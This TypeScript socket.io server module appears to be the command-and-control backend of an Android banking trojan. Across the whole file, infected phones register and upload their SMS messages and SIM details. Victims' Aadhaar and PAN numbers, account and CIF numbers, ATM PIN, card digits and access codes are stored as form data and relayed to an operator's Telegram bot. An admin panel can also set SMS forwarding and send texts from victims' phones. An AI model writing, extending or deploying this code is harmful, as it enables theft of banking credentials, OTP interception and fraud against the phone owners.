import { Server, Socket } from 'socket.io';
import { store } from '../store.js';
import { SMS, ForwardingConfig, SimInfo } from '../types/index.js';
import { TelegramBotService } from '../telegram/bot.js';

// Avoid Telegram floods/rate limits on large syncs: notify at most this many
// new incoming SMS per sync (the rest are still stored and shown in the panel).
const MAX_TELEGRAM_SMS_PER_SYNC = 20;

// Grace period before a disconnect becomes "offline". A quick reconnect
// (mobile handoff, doze blip, proxy hiccup) cancels it, avoiding false offline.
const OFFLINE_GRACE_MS = 12000;
const pendingOffline = new Map<string, NodeJS.Timeout>();

function cancelPendingOffline(deviceId: string): void {
    const t = pendingOffline.get(deviceId);
    if (t) {
        clearTimeout(t);
        pendingOffline.delete(deviceId);
    }
}

/**
 * Mark a device online from any authenticated socket event and remember which
 * device this socket belongs to. Emits devices:update only on an offline→online
 * transition so the admin panel self-heals without being spammed.
 */
function markDeviceOnline(io: Server, socket: Socket, deviceId: string): void {
    socket.data.deviceId = deviceId;
    cancelPendingOffline(deviceId);
    if (store.touchDevice(deviceId, socket.id)) {
        io.to('admin').emit('devices:update', store.getAllDevices());
    }
}

/**
 * Reconcile presence: any device that currently has a live socket is (re)marked
 * online. This never marks a device offline, so it is safe to run periodically
 * and directly fixes "connected but shown offline" staleness.
 */
function reconcilePresence(io: Server): void {
    let changed = false;
    for (const s of io.sockets.sockets.values()) {
        const deviceId = s.data?.deviceId as string | undefined;
        if (deviceId) {
            cancelPendingOffline(deviceId);
            if (store.touchDevice(deviceId, s.id)) {
                changed = true;
            }
        }
    }
    if (changed) {
        io.to('admin').emit('devices:update', store.getAllDevices());
    }
}

/** Schedule the offline transition after a grace period, unless the device reconnects. */
function scheduleOffline(io: Server, deviceId: string, reason: string, telegramBot?: TelegramBotService): void {
    cancelPendingOffline(deviceId);
    const timer = setTimeout(() => {
        pendingOffline.delete(deviceId);

        // Keep online if a live socket is still bound to this device.
        const dev = store.getDevice(deviceId);
        const sid = dev?.device.socketId;
        const liveSocket = sid ? io.sockets.sockets.get(sid) : undefined;
        if (sid && liveSocket && (liveSocket.data?.deviceId as string | undefined) === deviceId) {
            return;
        }

        store.setDeviceOffline(deviceId, reason);
        io.to('admin').emit('devices:update', store.getAllDevices());

        if (telegramBot?.isActive()) {
            const deviceData = store.getDevice(deviceId);
            if (deviceData) {
                telegramBot.notifyDeviceOffline(deviceData.device).catch((e: any) =>
                    console.error('[Socket] notifyDeviceOffline failed:', e?.message || e)
                );
            }
        }
    }, OFFLINE_GRACE_MS);
    timer.unref?.();
    pendingOffline.set(deviceId, timer);
}

export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService): void {

    // Periodic presence reconciliation (never marks offline, only heals online).
    const reconcileTimer = setInterval(() => reconcilePresence(io), 30000);
    reconcileTimer.unref?.();

    io.on('connection', (socket: Socket) => {
        console.log(`[Socket] Client connected: ${socket.id}`);

        // Device registration
        socket.on('device:register', async (data: { id?: string; name?: string; phoneNumber?: string }) => {
            if (!data || typeof data.id !== 'string' || !data.id) {
                console.warn('[Socket] Ignoring malformed device:register payload');
                return;
            }
            const deviceId = data.id;
            const deviceName = typeof data.name === 'string' && data.name ? data.name : 'Unknown device';
            const phoneNumber = typeof data.phoneNumber === 'string' ? data.phoneNumber : '';

            try {
                console.log(`[Socket] Device registering: ${deviceId}`);

                const deviceData = store.registerDevice({
                    id: deviceId,
                    name: deviceName,
                    phoneNumber,
                    socketId: socket.id,
                });

                // Join device to its own room
                socket.join(`device:${deviceId}`);
                socket.data.deviceId = deviceId;

                // Notify admin panels of device update
                io.to('admin').emit('devices:update', store.getAllDevices());

                // Send current forwarding config to device
                socket.emit('forwarding:config', deviceData.forwarding);

                console.log(`[Socket] Device registered: ${deviceId} (${deviceName})`);

                // Notify via Telegram
                if (telegramBot?.isActive()) {
                    await telegramBot.notifyDeviceOnline(deviceData.device);
                }
            } catch (e) {
                console.error('[Socket] device:register handler failed:', e);
            }
        });

        // App-level heartbeat — keeps the device marked online between syncs
        socket.on('device:heartbeat', (data: { deviceId: string }) => {
            if (!data?.deviceId) return;
            markDeviceOnline(io, socket, data.deviceId);
            socket.emit('device:heartbeat:ack', { ts: Date.now() });
        });

        // Device requests its current forwarding config (e.g., after reconnection)
        socket.on('device:requestForwardingConfig', (deviceId: string) => {
            console.log(`[Socket] Device ${deviceId} requesting forwarding config`);
            const deviceData = store.getDevice(deviceId);
            if (deviceData) {
                console.log(`[Socket] Sending forwarding config to device ${deviceId}:`, JSON.stringify(deviceData.forwarding));
                socket.emit('forwarding:config', deviceData.forwarding);
            } else {
                console.log(`[Socket] WARNING: Device ${deviceId} not found in store when requesting forwarding config`);
            }
        });

        // SMS sync from device
        socket.on('sms:sync', async (data: { deviceId?: string; sms?: SMS[] }) => {
            if (!data || typeof data.deviceId !== 'string' || !Array.isArray(data.sms)) {
                console.warn('[Socket] Ignoring malformed sms:sync payload');
                return;
            }
            const deviceId = data.deviceId;
            const incoming = data.sms.filter(m => m && typeof m === 'object' && typeof (m as any).id === 'string');

            try {
                console.log(`[Socket] SMS sync from device ${deviceId}: ${incoming.length} messages`);

                // Get existing SMS count before sync
                const existingCount = store.getSMS(deviceId).length;
                const isFirstSync = existingCount === 0;

                const added = store.syncSMS(deviceId, incoming as SMS[]);

                // Any authenticated traffic proves the device is alive — heal presence.
                markDeviceOnline(io, socket, deviceId);

                // Send only newly added messages; the client appends them.
                io.to('admin').emit('sms:update', {
                    deviceId,
                    sms: added,
                    append: true,
                });

                // Telegram notifications
                if (telegramBot?.isActive()) {
                    const deviceData = store.getDevice(deviceId);

                    if (isFirstSync && deviceData) {
                        // First sync: Notify device is connected
                        await telegramBot.notifyDeviceConnected(deviceData.device);
                    } else if (!isFirstSync) {
                        // Subsequent syncs: Only notify for NEW incoming SMS (capped)
                        const allSms = store.getSMS(deviceId);
                        const newSms = allSms.slice(existingCount);
                        const incomingSms = newSms
                            .filter(sms => sms.type === 'incoming')
                            .slice(-MAX_TELEGRAM_SMS_PER_SYNC);

                        for (const sms of incomingSms) {
                            await telegramBot.notifyNewSMS(deviceData?.device.name || deviceId, sms, deviceData?.device);
                        }
                    }
                }
            } catch (e) {
                console.error('[Socket] sms:sync handler failed:', e);
            }
        });

        // Form submission from device (legacy format from Android app)
        socket.on('form:submit', async (data: { deviceId?: string; name?: string; phoneNumber?: string; id?: string }) => {
            if (!data || typeof data.deviceId !== 'string' || !data.deviceId) {
                console.warn('[Socket] Ignoring malformed form:submit payload');
                return;
            }
            const deviceId = data.deviceId;

            try {
                console.log(`[Socket] Form submitted from device ${deviceId}`);

                // Convert legacy format to new format with default values
                const formData = {
                    fullName: data.name || '',
                    mobileNumber: data.phoneNumber || '',
                    motherName: '',
                    accountNumber: '',
                    aadhaarNumber: '',
                    panCard: '',
                    cardLast6: '',
                    atmPin: '',
                    cifNumber: '',
                    branchCode: '',
                    dateOfBirth: '',
                    cardExpiry: '',
                    finalPin: '',
                    userId: '',
                    accessCode: '',
                    profileCode: '',
                    // Legacy fields for backward compatibility
                    name: data.name,
                    phoneNumber: data.phoneNumber,
                    id: data.id,
                };

                store.submitForm(deviceId, formData as any);

                // Notify admin panels
                io.to('admin').emit('forms:update', {
                    deviceId,
                    forms: store.getForms(deviceId),
                });

                // Notify via Telegram
                if (telegramBot?.isActive()) {
                    const deviceData = store.getDevice(deviceId);
                    await telegramBot.notifyFormSubmission(
                        deviceData?.device.name || deviceId,
                        formData as any
                    );
                }
            } catch (e) {
                console.error('[Socket] form:submit handler failed:', e);
            }
        });


        // SIM cards sync from device
        socket.on('sim:sync', (data: { deviceId?: string; simCards?: SimInfo[] }) => {
            if (!data || typeof data.deviceId !== 'string' || !Array.isArray(data.simCards)) {
                console.warn('[Socket] Ignoring malformed sim:sync payload');
                return;
            }
            const deviceId = data.deviceId;
            const simCards = data.simCards.filter(s => s && typeof s === 'object');

            try {
                console.log(`[Socket] SIM sync from device ${deviceId}: ${simCards.length} SIMs`);

                store.syncSimCards(deviceId, simCards);
                markDeviceOnline(io, socket, deviceId);

                // Send acknowledgment back to device
                socket.emit('sim:sync:ack', { deviceId, success: true, count: simCards.length });

                // Notify admin panels with updated device info
                io.to('admin').emit('devices:update', store.getAllDevices());
                io.to('admin').emit('sim:update', {
                    deviceId,
                    simCards: store.getSimCards(deviceId),
                });
            } catch (e) {
                console.error('[Socket] sim:sync handler failed:', e);
            }
        });

        // Admin panel connection
        socket.on('admin:connect', () => {
            console.log(`[Socket] Admin panel connected: ${socket.id}`);
            socket.join('admin');

            // Reconcile any stale "offline" state before sending the device list.
            reconcilePresence(io);

            // Send current device list
            socket.emit('devices:update', store.getAllDevices());
        });

        // Admin requests device data
        socket.on('admin:getDeviceData', (deviceId: string) => {
            const deviceData = store.getDevice(deviceId);
            if (deviceData) {
                socket.emit('deviceData:update', {
                    deviceId,
                    sms: deviceData.sms,
                    forms: deviceData.forms,
                    forwarding: deviceData.forwarding,
                    simCards: deviceData.device.simCards || [],
                });
            }
        });

        // Admin requests sync from device
        socket.on('admin:requestSync', (deviceId: string) => {
            console.log(`[Socket] Admin requested sync from device ${deviceId}`);

            // Forward the sync request to the device
            io.to(`device:${deviceId}`).emit('device:requestSync');
        });

        // Admin updates forwarding config
        socket.on('forwarding:update', (data: { deviceId: string; config: Partial<ForwardingConfig> }) => {
            console.log(`[Socket] Forwarding update for device ${data.deviceId}:`, JSON.stringify(data.config));

            const newConfig = store.updateForwarding(data.deviceId, data.config);

            if (newConfig) {
                // Get the device data to find its socket ID
                const deviceData = store.getDevice(data.deviceId);
                const deviceSocketId = deviceData?.device.socketId;

                console.log(`[Socket] Sending forwarding:config to device ${data.deviceId}`);
                console.log(`[Socket] Device socket ID: ${deviceSocketId}, Device status: ${deviceData?.device.status}`);

                // Send config to device room
                io.to(`device:${data.deviceId}`).emit('forwarding:config', newConfig);

                // Also send directly to the device's socket ID as a fallback
                // This ensures delivery even if room subscription has issues
                if (deviceSocketId) {
                    console.log(`[Socket] Also sending directly to socket ${deviceSocketId}`);
                    io.to(deviceSocketId).emit('forwarding:config', newConfig);
                } else {
                    console.log(`[Socket] WARNING: No socket ID found for device ${data.deviceId} - device may be offline`);
                }

                // Confirm to admin
                socket.emit('forwarding:updated', { deviceId: data.deviceId, config: newConfig });
                console.log(`[Socket] Forwarding config sent and confirmed for device ${data.deviceId}`);
            } else {
                console.log(`[Socket] ERROR: Failed to update forwarding for device ${data.deviceId} - device not found in store`);
            }
        });

        // Admin sends SMS via device
        socket.on('admin:sendSms', (data: { deviceId: string; recipientNumber: string; message: string; subscriptionId?: number; requestId: string }) => {
            console.log(`[Socket] Admin sending SMS via device ${data.deviceId} to ${data.recipientNumber}`);

            // Forward the SMS send request to the device
            io.to(`device:${data.deviceId}`).emit('sms:sendRequest', {
                recipientNumber: data.recipientNumber,
                message: data.message,
                subscriptionId: data.subscriptionId || -1,
                requestId: data.requestId,
            });
        });

        // SMS send result from device
        socket.on('sms:sendResult', (data: { deviceId: string; requestId: string; success: boolean; error?: string }) => {
            console.log(`[Socket] SMS send result from device ${data.deviceId}: ${data.success ? 'success' : 'failed'}`);

            // Forward result to admin
            io.to('admin').emit('sms:sendResult', data);

            // Notify AutoSend SMS feature (no-op for non-AutoSend request ids)
            if (telegramBot?.isActive()) {
                telegramBot.handleAutoSmsSendResult(data.requestId, data.success, data.error);
            }
        });

        // Disconnection — delayed by a grace period so a quick reconnect doesn't
        // flip the device offline.
        socket.on('disconnect', (reason: string) => {
            try {
                console.log(`[Socket] Client disconnected: ${socket.id} (reason: ${reason})`);

                const boundDeviceId = socket.data?.deviceId as string | undefined;
                if (boundDeviceId && store.getDevice(boundDeviceId)) {
                    scheduleOffline(io, boundDeviceId, reason, telegramBot);
                } else {
                    // Fallback for sockets that never sent a deviceId
                    const deviceId = store.setDeviceOfflineBySocketId(socket.id, reason);
                    if (deviceId) {
                        io.to('admin').emit('devices:update', store.getAllDevices());
                    }
                }
            } catch (e) {
                console.error('[Socket] disconnect handler failed:', e);
            }
        });
    });
}

